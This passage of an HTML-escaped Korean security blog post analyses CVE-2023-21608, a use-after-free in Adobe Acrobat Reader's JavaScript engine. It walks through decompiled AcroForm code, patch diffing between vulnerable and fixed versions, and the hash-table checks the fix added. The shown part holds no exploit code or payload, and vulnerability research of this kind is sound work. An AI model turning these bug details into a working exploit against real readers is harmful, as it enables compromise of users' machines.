  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;type == &lt;span class=&#34;hljs-number&#34;&gt;0x13&lt;/span&gt; )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      CAgg::convert(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, a2, &lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;);
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v9, (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)&amp;amp;someID);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; *v4 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;AcroForm!EScript_ESObjectEnum_CallbackProc&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;CAgg:operator[]&lt;/code&gt;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;this&lt;/code&gt;)&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &lt;code&gt;pCagg&lt;/code&gt;&amp;#xAC00; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xBA70; &amp;#xC774;&amp;#xB294; &lt;code&gt;pCAggData&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628; &amp;#xC8FC;&amp;#xC18C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __usercall EScript_ESObjectEnum_CallbackProc@&amp;lt;eax&amp;gt;(
        &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; (*ebx0)[&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;]@&amp;lt;ebx&amp;gt;,
        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2,
        &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *key_str,
        &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a4,
        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; ***pCAggData)
{
  CAgg **pCagg; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 someID; &lt;span class=&#34;hljs-comment&#34;&gt;// ax&lt;/span&gt;
  CAgg *v7; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  pCagg = (CAgg **)*pCAggData;
  someID = (*(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__cdecl **)(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *))(gCoreHFT + &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;))(key_str); 
  v7 = (CAgg *)CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]((CAgg *)pCagg, ebx0, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)someID);
  ESValToCAgg(v7, a4, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-&amp;#xD328;&amp;#xCE58;-&amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;a href=&#34;#3-&amp;#xD328;&amp;#xCE58;-&amp;#xBD84;&amp;#xC11D;&#34; class=&#34;headerlink&#34; title=&#34;3.  &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;/a&gt;3.  &amp;#xD328;&amp;#xCE58; &amp;#xBD84;&amp;#xC11D;&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; Acrobat&amp;#xC758; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xC5D4;&amp;#xC9C4;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xB54C;&amp;#xB3C4; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xACE0; &amp;#xB4A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xB8F0; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xB9C8;&amp;#xCC2C;&amp;#xAC00;&amp;#xC9C0;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD3C9;&amp;#xC18C;&amp;#xC5D0; &amp;#xBCF4;&amp;#xB358; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xB4E4;&amp;#xACFC;&amp;#xB294; &amp;#xACB0;&amp;#xC774; &amp;#xB2E4;&amp;#xB974;&amp;#xB2E4;&amp;#xB294;&amp;#xAC8C; &amp;#xB290;&amp;#xAEF4;&amp;#xC9C0;&amp;#xB124;&amp;#xC694; &amp;#x1F972;&lt;/p&gt;
&lt;p&gt;&amp;#xBC14;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &amp;#xBA3C;&amp;#xC800; &amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;! &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xC544;&amp;#xB2CC; &amp;#xB9CC;&amp;#xD07C; &amp;#xD328;&amp;#xCE58; &amp;#xB610;&amp;#xD55C; &amp;#xCF54;&amp;#xB4DC; &amp;#xD55C; &amp;#xB450;&amp;#xC904;&amp;#xC5D0;&amp;#xC11C; &amp;#xB05D;&amp;#xB0A0;&amp;#xB9AC; &amp;#xC5C6;&amp;#xACA0;&amp;#xC8E0;? &lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;(Adobe Acrobat Reader DC 2022.003.20310)&amp;#xACFC; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;(Adobe Acrobat Reader DC 2022.001.20085)&amp;#xC758; &lt;code&gt;AcroForm.api&lt;/code&gt;&amp;#xB97C; Diffing&amp;#xD558;&amp;#xC5EC; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;primary&amp;#xC640; secondary&amp;#xB294; &amp;#xAC01;&amp;#xAC01; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xACFC; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &lt;code&gt;AcroForm.api&lt;/code&gt; &amp;#xC774;&amp;#xACE0; &amp;#xB458; &amp;#xC0AC;&amp;#xC774;&amp;#xC5D0; match&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4; &amp;#xC911;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xACFC; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;, &lt;code&gt;SetRichChangeEventProp&lt;/code&gt;&amp;#xACFC; &lt;code&gt;GetRichChangeEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC911;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC758; &amp;#xCC28;&amp;#xC774;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB178;&amp;#xB780;&amp;#xC0C9;&amp;#xC73C;&amp;#xB85C; &amp;#xD45C;&amp;#xC2DC;&amp;#xB41C; Basic Block&amp;#xC740; &amp;#xD328;&amp;#xCE58; &amp;#xC804;&amp;#xD6C4;&amp;#xB85C; &amp;#xCC28;&amp;#xC774;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; Match&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC73C;&amp;#xB85C; &amp;#xC67C;&amp;#xCABD;&amp;#xC774; primary(&amp;#xD328;&amp;#xCE58; &amp;#xC804;), &amp;#xC624;&amp;#xB978;&amp;#xCABD;&amp;#xC774; secondary(&amp;#xD328;&amp;#xCE58; &amp;#xD6C4;)&amp;#xC774;&amp;#xBA70; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC640; Basic Block&amp;#xC740; primary&amp;#xC5D0;&amp;#xB294; &amp;#xC5C6;&amp;#xC9C0;&amp;#xB9CC; secondary&amp;#xC5D0;&amp;#xB294; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC989; &amp;#xD328;&amp;#xCE58;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD574;&amp;#xACB0;&amp;#xD558;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xB77C;&amp;#xACE0; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xAC70;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xD06C;&amp;#xAC8C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0; &amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xC804;, &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC774; &amp;#xC120;&amp;#xD589;&amp;#xB418;&amp;#xACE0; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC73C;&amp;#xB85C;&amp;#xC758; &amp;#xBD84;&amp;#xAE30; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xACB0;&amp;#xC815;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; Basic Block&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xC804;&amp;#xD6C4;&amp;#xB85C; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;  PointerType = sub_20A4BC05(v31, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
  PointerType_1 = PointerType;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
  {
    LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
    {
      v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
      LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
      CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
      PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
    }
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;AcroForm.api&lt;/code&gt;&amp;#xC740; &amp;#xC2EC;&amp;#xBCFC;&amp;#xC774; &amp;#xC5C6;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC744; &amp;#xC815;&amp;#xC131;&amp;#xC2A4;&amp;#xB7FD;&amp;#xAC8C; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xC640; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xB4F1; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBD99;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC; &amp;#xC5F4;&amp;#xAC70; &amp;#xB3C4;&amp;#xC911;&amp;#xC5D0; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC774; free&amp;#xB418;&amp;#xB294; &amp;#xBC84;&amp;#xADF8;&amp;#xC758; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC744; &amp;#xB9C9;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;IsDataInGlobalHashTable&#34;&gt;&lt;a href=&#34;#IsDataInGlobalHashTable&#34; class=&#34;headerlink&#34; title=&#34;IsDataInGlobalHashTable&#34;&gt;&lt;/a&gt;IsDataInGlobalHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;IsDataInGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Data)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+0h] [ebp-4h] BYREF&lt;/span&gt;

  a2 = v1;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Data &amp;amp;&amp;amp; sub_20AD638B(&amp;amp;GlobalHashTable, (ListEntry *)&amp;amp;a2, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink != GlobalHashTable.DefaultHead;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC740; &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC774; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;HashTable&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC778; &amp;#xC804;&amp;#xC5ED; &amp;#xBCC0;&amp;#xC218;&amp;#xB85C; &amp;#xC5F0;&amp;#xAD00;&amp;#xB41C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC758; &amp;#xBA85;&amp;#xCE6D;&amp;#xACFC; &amp;#xC815;&amp;#xC758;&amp;#xB294; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC720;&amp;#xCD94;&amp;#xD55C; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;HashTable&#34;&gt;&lt;a href=&#34;#HashTable&#34; class=&#34;headerlink&#34; title=&#34;HashTable&#34;&gt;&lt;/a&gt;HashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;ListEntry       struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_221)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;Flink           dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;Blink           dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;ListEntry       ends
&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketEntry struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x10, mappedto_223)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;list_entry      union1 ?                
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;Data&lt;/span&gt;            dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C field_C         dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000010 &lt;/span&gt;HashBucketEntry ends
&lt;span class=&#34;hljs-number&#34;&gt;00000010&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashTable       struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x30, mappedto_224)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;unknown0        dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;DefaultHead     dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;length          dd ?
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C HashBuckets     HashBucketTable ?       
&lt;span class=&#34;hljs-symbol&#34;&gt;00000020 &lt;/span&gt;field_20        dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000020 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000024 &lt;/span&gt;field_24        dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000028 &lt;/span&gt;field_28        dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000028 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-number&#34;&gt;0000002&lt;/span&gt;C field_2C        dd ?                    
&lt;span class=&#34;hljs-number&#34;&gt;0000002&lt;/span&gt;C                                         
&lt;span class=&#34;hljs-symbol&#34;&gt;00000030 &lt;/span&gt;HashTable       ends
&lt;span class=&#34;hljs-number&#34;&gt;00000030&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketTable struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x14, mappedto_227)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketBegin dd ?                    
